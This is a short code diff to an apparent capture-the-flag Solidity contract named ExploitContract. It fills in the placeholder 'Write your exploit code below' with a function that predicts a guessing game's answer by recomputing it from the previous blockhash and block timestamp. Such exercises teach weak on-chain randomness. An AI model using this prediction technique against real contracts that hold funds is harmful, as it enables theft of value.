@@ -53,5 +53,18 @@ contract ExploitContract {
         predictTheFuture = _predictTheFuture;
     }
 
-    // Write your exploit code below
+    function testSettle(uint256 guess) public view returns (bool) {
+        uint8 answer = uint8(
+            uint256(
+                keccak256(
+                    abi.encodePacked(
+                        blockhash(block.number - 1),
+                        block.timestamp
+                    )
+                )
+            )
+        ) % 10;
+
+        return answer == guess;
+    }
 }
